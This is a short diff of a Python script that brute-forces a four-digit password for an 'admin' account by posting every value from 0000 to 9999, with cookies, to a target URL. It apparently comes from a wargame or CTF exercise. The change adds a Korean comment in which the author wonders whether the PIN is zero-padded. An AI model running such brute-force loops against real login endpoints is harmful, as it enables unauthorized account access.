@@ -11,6 +11,8 @@ params = {"id":"admin"}
 
 for a in range(10000):
 #Try to 9999 from 0
+    #params["pw"]=a
+#형식이 4자리로 이루어진 것인지 아님 그냥 숫자인지 확실하지가 않다.
     params["pw"]=str(a).zfill(4)
 #Insert the pw Value 4 Digits Type
     response = req.post(URL, cookies=cookies, params=params)
